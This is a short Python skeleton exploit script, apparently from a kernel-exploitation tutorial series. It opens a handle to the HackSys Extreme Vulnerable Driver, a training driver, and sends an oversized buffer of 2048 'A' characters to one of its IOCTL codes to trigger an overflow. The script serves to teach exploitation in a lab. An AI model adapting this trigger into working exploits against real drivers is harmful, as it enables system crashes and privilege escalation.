#************************************************************
#skel.py: Skeleton script, the starting base for the exploit.
#************************************************************
#Written by r0otki7 <https://github.com/r0otki7/>
#************************************************************
#Website: https://rootkits.xyz
#************************************************************

import ctypes, sys
from ctypes import *

def logo():
	print """
		_ \        |    |    _) ___  | 
	   __| |   |  _ \  __|  |  /  |     /  
	  |    |   | (   | |      <   |    /   
	 _|   \___/ \___/ \__| _|\_\ _|  _/    
										   
	"""

def main():
	logo()
	kernel32 = windll.kernel32
	hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)
	 
	if not hevDevice or hevDevice == -1:
		print "*** Couldn't get Device Driver handle."
		sys.exit(0)
	 
	buf = "A"*2048
	bufLength = len(buf)
	 
	kernel32.DeviceIoControl(hevDevice, 0x222003, buf, bufLength, None, 0, byref(c_ulong()), None)
	
if __name__ == "__main__":
    main()